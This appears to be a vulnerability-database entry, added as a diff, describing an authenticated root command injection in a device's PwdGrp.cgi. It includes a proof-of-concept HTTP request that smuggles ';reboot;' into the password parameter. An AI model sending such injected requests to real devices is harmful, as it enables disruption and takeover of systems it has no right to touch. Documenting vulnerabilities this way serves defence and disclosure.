@@ -1,0 +1,15 @@
+{"Vulnerability Details":"Authenticated command injection in PwdGrp.cgi:
+The PwdGrp.cgi uses the username, password and group 
+parameters in a new user creation or modification request in a 
+system command without validation or sanitization. Thus and 
+attacker can execute arbitrary system commands with root 
+privileges. We are aware that this vulnerability is being 
+exploited in the wild!
+", "code":"
+GET cgi-bin/supervisor/PwdGrp.cgi?action=add&user=test&pwd=;reboot;&grp=SUPERVISOR&lifetime=5%20MIN HTTP/1.1
+Host: 107.xx.8.xx
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.18.4
+"}
